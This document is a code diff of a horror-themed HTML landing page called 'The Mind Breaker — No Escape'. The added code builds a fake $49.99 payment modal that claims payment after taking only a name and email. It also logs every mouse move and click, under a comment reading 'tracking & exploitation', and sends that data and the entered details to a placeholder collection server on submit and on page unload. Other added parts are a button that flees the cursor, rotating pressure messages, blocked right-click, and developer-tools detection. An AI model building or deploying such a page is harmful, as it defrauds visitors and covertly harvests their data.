@@ -1,253 +1,423 @@
 <!DOCTYPE html>
 <html lang="en" >
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>🩸 PAGE 7 — MIND BREAKER — NO ESCAPE 🩸</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Creepster&display=swap');
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>🩸 THE MIND BREAKER — NO ESCAPE 🩸</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Creepster&display=swap');
 
-    /* Base & Body */
-    html, body {
-      margin: 0; padding: 0;
-      height: 100%;
-      background: radial-gradient(circle at center, #0a0000 0%, #000000 100%);
-      color: #ff0000;
-      font-family: 'Creepster', cursive, monospace;
-      overflow: hidden;
-      user-select: none;
-      position: relative;
-    }
-    body {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      padding: 20px;
-      filter: drop-shadow(0 0 8px #ff0000);
-      animation: bloodPulse 3s infinite alternate;
-    }
+  html, body {
+    margin: 0; padding: 0; height: 100%;
+    background: radial-gradient(circle at center, #080000 0%, #000000 100%);
+    font-family: 'Creepster', cursive, monospace;
+    color: #ff0000;
+    overflow: hidden;
+    user-select: none;
+    position: relative;
+  }
+  body {
+    display: flex; justify-content: center; align-items: center; text-align: center;
+    position: relative;
+    background: black;
+  }
 
-    /* Title with Glitch & Flicker */
-    h1 {
-      font-size: 5em;
-      margin-bottom: 0.3em;
-      position: relative;
-      color: #ff0000;
-      text-transform: uppercase;
-      animation: glitch 2.5s infinite;
-      filter: drop-shadow(0 0 15px #ff0000);
-      user-select: none;
-    }
-    h1::before, h1::after {
-      content: attr(data-text);
-      position: absolute;
-      left: 0; top: 0;
-      width: 100%; height: 100%;
-      opacity: 0.8;
-      clip: rect(0, 900px, 0, 0);
-    }
-    h1::before {
-      left: 2px;
-      text-shadow: -2px 0 #ff0040;
-      animation: glitchTop 2s infinite linear alternate-reverse;
-    }
-    h1::after {
-      left: -2px;
-      text-shadow: -2px 0 #ff00c8;
-      animation: glitchBottom 1.5s infinite linear alternate-reverse;
-    }
+  h1 {
+    font-size: 6rem;
+    position: relative;
+    text-transform: uppercase;
+    animation: glitch 3s infinite linear;
+    color: #ff0000;
+    text-shadow: 0 0 10px #ff0000;
+  }
+  h1::before, h1::after {
+    content: attr(data-text);
+    position: absolute;
+    left: 0; top: 0;
+    width: 100%; height: 100%;
+    opacity: 0.7;
+    clip: rect(0, 900px, 0, 0);
+  }
+  h1::before {
+    left: 3px;
+    text-shadow: -3px 0 #ff0033;
+    animation: glitchTop 2s infinite linear alternate-reverse;
+  }
+  h1::after {
+    left: -3px;
+    text-shadow: -3px 0 #ff00cc;
+    animation: glitchBottom 1.5s infinite linear alternate-reverse;
+  }
 
-    /* Paragraph */
-    p {
-      font-size: 1.6em;
-      max-width: 720px;
-      line-height: 1.6;
-      margin-bottom: 2.5em;
-      text-shadow: 0 0 10px #800000;
-      user-select: none;
-    }
+  p {
+    font-size: 1.5rem;
+    max-width: 700px;
+    margin: 2rem auto;
+    color:#ff4444;
+    text-shadow: 0 0 5px #ff0000;
+    min-height: 80px;
+  }
 
-    /* Button */
-    a.button {
-      font-size: 2em;
-      font-weight: 900;
-      padding: 25px 60px;
-      color: #000;
-      background: linear-gradient(45deg, #ff0000, #800000);
-      border-radius: 100px;
-      text-decoration: none;
-      box-shadow: 0 0 30px #ff0000, 0 0 60px #800000 inset;
-      position: relative;
-      overflow: hidden;
-      user-select: none;
-      transition: background 0.3s ease, color 0.3s ease;
-      z-index: 10;
-    }
-    a.button:hover {
-      background: linear-gradient(45deg, #ff4444, #b30000);
-      color: #fff;
-      box-shadow: 0 0 40px #ff4444, 0 0 90px #b30000 inset;
-    }
-    a.button::before {
-      content: "";
-      position: absolute;
-      top: 0; left: -75%;
-      width: 50%;
-      height: 100%;
-      background: rgba(255,255,255,0.2);
-      transform: skewX(-25deg);
-      transition: left 0.7s ease;
-      z-index: 20;
-    }
-    a.button:hover::before {
-      left: 175%;
-    }
+  button#darkUnlock {
+    margin-top: 2rem;
+    padding: 25px 60px;
+    font-size: 2.2rem;
+    font-weight: 900;
+    background: linear-gradient(45deg, #ff0000, #800000);
+    border: none;
+    border-radius: 100px;
+    box-shadow: 0 0 40px #ff0000 inset;
+    color: black;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden;
+    user-select: none;
+    transition: all 0.3s ease;
+    z-index: 20;
+  }
+  button#darkUnlock:hover {
+    background: linear-gradient(45deg, #ff4444, #b30000);
+    color: white;
+    box-shadow: 0 0 70px #ff4444 inset;
+  }
+  button#darkUnlock::before {
+    content: "";
+    position: absolute;
+    top: 0; left: -70%;
+    width: 50%;
+    height: 100%;
+    background: rgba(255,255,255,0.2);
+    transform: skewX(-25deg);
+    transition: left 0.7s ease;
+    z-index: 10;
+  }
+  button#darkUnlock:hover::before {
+    left: 170%;
+  }
 
-    /* Blood Drips */
-    .blood-drip {
-      position: fixed;
-      width: 7px;
-      height: 70px;
-      background: linear-gradient(180deg, #ff0000 0%, #500000 100%);
-      border-radius: 4px;
-      box-shadow: 0 0 25px #ff0000;
-      animation: drip 2.3s infinite ease-in-out;
-      opacity: 0.9;
-      z-index: 100;
-      user-select: none;
-    }
-    .blood-drip:nth-child(1) {
-      left: 22%;
-      animation-delay: 0s;
-    }
-    .blood-drip:nth-child(2) {
-      left: 44%;
-      animation-delay: 0.8s;
-      height: 90px;
-    }
-    .blood-drip:nth-child(3) {
-      left: 66%;
-      animation-delay: 1.5s;
-      height: 80px;
-    }
+  #bloodCanvas {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    pointer-events: none;
+    z-index: 0;
+  }
 
-    /* Animations */
-    @keyframes drip {
-      0% { top: -80px; opacity: 0.9; }
-      50% { top: 85vh; opacity: 1; }
-      100% { top: -80px; opacity: 0.9; }
-    }
+  /* Modal styles */
+  #paymentModal {
+    display: none;
+    position: fixed;
+    z-index: 50;
+    left: 0; top: 0;
+    width: 100vw; height: 100vh;
+    background: rgba(0,0,0,0.95);
+    color: #ff0000;
+    font-family: 'Creepster', cursive, monospace;
+    text-align: center;
+    padding: 40px 20px;
+  }
+  #paymentModal.active {
+    display: block;
+  }
+  #paymentModal h2 {
+    font-size: 3rem;
+    margin-bottom: 1rem;
+    text-shadow: 0 0 15px #ff0000;
+  }
+  #paymentModal p {
+    font-size: 1.5rem;
+    margin-bottom: 2rem;
+    text-shadow: 0 0 10px #880000;
+  }
+  #paymentForm {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  #paymentForm input[type="text"], #paymentForm input[type="email"] {
+    padding: 15px 20px;
+    font-size: 1.2rem;
+    border-radius: 50px;
+    border: none;
+    margin-bottom: 20px;
+    width: 300px;
+  }
+  #paymentForm button {
+    background: linear-gradient(45deg, #ff0000, #800000);
+    border: none;
+    border-radius: 50px;
+    padding: 15px 50px;
+    font-size: 1.8rem;
+    color: black;
+    font-weight: 900;
+    cursor: pointer;
+    box-shadow: 0 0 40px #ff0000 inset;
+    transition: all 0.3s ease;
+  }
+  #paymentForm button:hover {
+    background: linear-gradient(45deg, #ff4444, #b30000);
+    color: white;
+    box-shadow: 0 0 70px #ff4444 inset;
+  }
 
-    @keyframes bloodPulse {
-      0% { filter: drop-shadow(0 0 10px #ff0000); }
-      100% { filter: drop-shadow(0 0 30px #ff0000); }
-    }
+  /* Prevent right click & select */
+  body {
+    -webkit-user-select: none; 
+    -moz-user-select: none; 
+    -ms-user-select: none; 
+    user-select: none; 
+  }
 
-    @keyframes glitch {
-      0% {
-        clip-path: inset(0 0 0 0);
-        transform: translate(0);
-      }
-      20% {
-        clip-path: inset(10% 0 15% 0);
-        transform: translate(-2px, -2px);
-      }
-      40% {
-        clip-path: inset(15% 0 20% 0);
-        transform: translate(2px, 2px);
-      }
-      60% {
-        clip-path: inset(50% 0 10% 0);
-        transform: translate(-2px, 2px);
-      }
-      80% {
-        clip-path: inset(15% 0 30% 0);
-        transform: translate(2px, -2px);
-      }
-      100% {
-        clip-path: inset(0 0 0 0);
-        transform: translate(0);
-      }
+  /* Animations */
+  @keyframes glitch {
+    0% {
+      clip-path: inset(0 0 0 0);
+      transform: translate(0);
     }
-    @keyframes glitchTop {
-      0% {
-        clip-path: inset(0 0 50% 0);
-        transform: translate(0);
-      }
-      50% {
-        clip-path: inset(10% 0 40% 0);
-        transform: translate(-2px, -2px);
-      }
-      100% {
-        clip-path: inset(0 0 50% 0);
-        transform: translate(0);
-      }
+    20% {
+      clip-path: inset(15% 0 20% 0);
+      transform: translate(-4px, -3px);
     }
-    @keyframes glitchBottom {
-      0% {
-        clip-path: inset(50% 0 0 0);
-        transform: translate(0);
-      }
-      50% {
-        clip-path: inset(40% 0 10% 0);
-        transform: translate(2px, 2px);
-      }
-      100% {
-        clip-path: inset(50% 0 0 0);
-        transform: translate(0);
-      }
+    40% {
+      clip-path: inset(30% 0 10% 0);
+      transform: translate(4px, 3px);
     }
-
-    /* Dark flicker background */
-    #darkness {
-      position: fixed;
-      top:0; left:0;
-      width: 100%; height: 100%;
-      background: radial-gradient(circle at center, rgba(255,0,0,0.1) 0%, rgba(0,0,0,0.9) 100%);
-      pointer-events: none;
-      animation: flickerDark 4s infinite alternate;
-      z-index: 0;
+    60% {
+      clip-path: inset(10% 0 40% 0);
+      transform: translate(-3px, 4px);
     }
-    @keyframes flickerDark {
-      0% { opacity: 0.12; }
-      100% { opacity: 0.3; }
+    80% {
+      clip-path: inset(20% 0 30% 0);
+      transform: translate(3px, -4px);
     }
-  </style>
+    100% {
+      clip-path: inset(0 0 0 0);
+      transform: translate(0);
+    }
+  }
+  @keyframes glitchTop {
+    0% {
+      clip-path: inset(0 0 50% 0);
+      transform: translate(0);
+    }
+    50% {
+      clip-path: inset(10% 0 40% 0);
+      transform: translate(-5px, -5px);
+    }
+    100% {
+      clip-path: inset(0 0 50% 0);
+      transform: translate(0);
+    }
+  }
+  @keyframes glitchBottom {
+    0% {
+      clip-path: inset(50% 0 0 0);
+      transform: translate(0);
+    }
+    50% {
+      clip-path: inset(40% 0 10% 0);
+      transform: translate(5px, 5px);
+    }
+    100% {
+      clip-path: inset(50% 0 0 0);
+      transform: translate(0);
+    }
+  }
+</style>
 </head>
 <body>
-  <div id="darkness"></div>
 
-  <div class="blood-drip"></div>
-  <div class="blood-drip"></div>
-  <div class="blood-drip"></div>
+<h1 data-text="🩸 THE MIND BREAKER — NO ESCAPE 🩸">🩸 THE MIND BREAKER — NO ESCAPE 🩸</h1>
 
-  <h1 data-text="🩸 PAGE 7 — MIND BREAKER — NO ESCAPE">🩸 PAGE 7 — MIND BREAKER — NO ESCAPE</h1>
-  <p>
-    These messages cut deeper than any blade.<br/>
-    They burn pride, twist reality, and shatter the mind.<br/>
-    Once unlocked... <strong>your soul is trapped forever.</strong>
-  </p>
+<p>
+  These messages tear your pride apart,<br />
+  shatter your reality,<br />
+  and leave your soul trapped forever.<br />
+  <strong>Do you dare to unlock the darkness?</strong>
+</p>
 
-  <a class="button" href="https://your-drive-link.com" target="_blank" rel="noopener noreferrer" tabindex="-1">
-    🔥 Unlock the Darkness Now
-  </a>
+<button id="darkUnlock">🔥 Unlock the Darkness Now</button>
 
-  <audio autoplay loop>
-    <source src="https://cdn.pixabay.com/download/audio/2022/03/23/audio_2a38831ac7.mp3?filename=heartbeat-6956.mp3" type="audio/mpeg" />
-  </audio>
+<canvas id="bloodCanvas"></canvas>
 
-  <script>
-    // Flicker opacity on heading
-    const glitchEl = document.querySelector('h1');
-    setInterval(() => {
-      glitchEl.style.opacity = glitchEl.style.opacity === '1' ? '0.7' : '1';
-    }, 550);
+<!-- Payment Modal -->
+<div id="paymentModal">
+  <h2>⚠️ Payment Required ⚠️</h2>
+  <p>To access the darkness, enter your details and complete the ritual.</p>
+  <form id="paymentForm">
+    <input type="text" id="name" placeholder="Your Name" required autocomplete="off" />
+    <input type="email" id="email" placeholder="Your Email" required autocomplete="off" />
+    <button type="submit">Pay $49.99</button>
+  </form>
+</div>
 
-    // Prevent right click & selection
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('selectstart', e => e.preventDefault());
-  </script>
+<audio autoplay loop>
+  <source src="https://cdn.pixabay.com/download/audio/2022/03/23/audio_2a38831ac7.mp3?filename=heartbeat-6956.mp3" type="audio/mpeg" />
+</audio>
+
+<script>
+  // Canvas blood drip effect
+  const canvas = document.getElementById('bloodCanvas');
+  const ctx = canvas.getContext('2d');
+  let w, h;
+  function resize() {
+    w = canvas.width = window.innerWidth;
+    h = canvas.height = window.innerHeight;
+  }
+  resize();
+  window.addEventListener('resize', resize);
+
+  class Drop {
+    constructor() {
+      this.x = Math.random() * w;
+      this.y = Math.random() * -h;
+      this.length = 40 + Math.random() * 60;
+      this.speed = 2 + Math.random() * 3;
+      this.opacity = 0.7 + Math.random() * 0.3;
+      this.width = 4 + Math.random() * 3;
+    }
+    update() {
+      this.y += this.speed;
+      if (this.y > h) {
+        this.y = Math.random() * -100;
+        this.x = Math.random() * w;
+      }
+    }
+    draw() {
+      const gradient = ctx.createLinearGradient(this.x, this.y, this.x, this.y + this.length);
+      gradient.addColorStop(0, 'rgba(255,0,0,' + this.opacity + ')');
+      gradient.addColorStop(1, 'rgba(80,0,0,0)');
+      ctx.fillStyle = gradient;
+      ctx.fillRect(this.x, this.y, this.width, this.length);
+      ctx.beginPath();
+      ctx.arc(this.x + this.width/2, this.y + this.length, this.width/2, 0, Math.PI * 2);
+      ctx.fillStyle = 'rgba(255,0,0,' + this.opacity + ')';
+      ctx.fill();
+    }
+  }
+
+  const drops = [];
+  for(let i = 0; i < 70; i++) {
+    drops.push(new Drop());
+  }
+
+  function animate() {
+    ctx.clearRect(0, 0, w, h);
+    for(let d of drops) {
+      d.update();
+      d.draw();
+    }
+    requestAnimationFrame(animate);
+  }
+  animate();
+
+  // Button runaway behavior
+  const button = document.getElementById('darkUnlock');
+  button.style.position = 'relative';
+  let runaway = true;
+  let forcedClickCount = 0;
+
+  button.addEventListener('mouseenter', () => {
+    if(forcedClickCount >= 3) return; // بعد 3 محاولات لا يهرب
+    if(!runaway) return;
+    button.style.position = 'absolute';
+    button.style.top = (Math.random() * (window.innerHeight - button.offsetHeight)) + 'px';
+    button.style.left = (Math.random() * (window.innerWidth - button.offsetWidth)) + 'px';
+    forcedClickCount++;
+  });
+
+  // Payment modal logic
+  const modal = document.getElementById('paymentModal');
+  button.addEventListener('click', () => {
+    runaway = false;
+    button.style.position = 'relative';
+    button.style.top = '0';
+    button.style.left = '0';
+    modal.classList.add('active');
+  });
+
+  // Data collection for tracking & exploitation
+  const dataLog = {
+    mouseMoves: [],
+    clicks: [],
+    timestamps: [],
+    timeSpent: 0,
+    startTime: Date.now(),
+  };
+
+  document.addEventListener('mousemove', e => {
+    dataLog.mouseMoves.push({x: e.clientX, y: e.clientY, t: Date.now()});
+  });
+
+  document.addEventListener('click', e => {
+    dataLog.clicks.push({x: e.clientX, y: e.clientY, t: Date.now()});
+  });
+
+  setInterval(() => {
+    dataLog.timeSpent = Date.now() - dataLog.startTime;
+  }, 1000);
+
+  // Psychological pressure text change
+  const p = document.querySelector('p');
+  let pressureSteps = [
+    "These messages tear your pride apart,",
+    "Shatter your reality,",
+    "Trap your soul forever.",
+    "Do you dare to unlock the darkness?",
+    "The darkness is watching... waiting...",
+    "One click can change everything...",
+    "Don't let it slip away...",
+  ];
+  let stepIndex = 0;
+
+  setInterval(() => {
+    p.textContent = pressureSteps[stepIndex];
+    stepIndex = (stepIndex + 1) % pressureSteps.length;
+  }, 8000);
+
+  // Submit payment form & send data
+  const form = document.getElementById('paymentForm');
+  form.addEventListener('submit', e => {
+    e.preventDefault();
+    const name = form.querySelector('#name').value.trim();
+    const email = form.querySelector('#email').value.trim();
+    if(name && email){
+      alert('Payment processed. The darkness is unlocked for you.');
+      dataLog.payment = {name, email, time: Date.now()};
+      sendData();
+      modal.classList.remove('active');
+      window.location.href = 'https://your-drive-link.com';
+    } else {
+      alert('Please fill all fields.');
+    }
+  });
+
+  // Send data function
+  function sendData() {
+    fetch('https://your-server.com/collect', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(dataLog),
+    }).catch(e => console.log('Data send failed', e));
+  }
+
+  // Send data before unload
+  window.addEventListener('beforeunload', sendData);
+  window.addEventListener('unload', sendData);
+
+  // Disable right click & text selection
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  document.addEventListener('selectstart', e => e.preventDefault());
+
+  // Detect devtools (basic)
+  let threshold = 160;
+  window.addEventListener('resize', () => {
+    if(window.outerWidth - window.innerWidth > threshold ||
+       window.outerHeight - window.innerHeight > threshold) {
+      alert('Developer tools are forbidden.');
+      location.reload();
+    }
+  });
+</script>
 </body>
 </html>
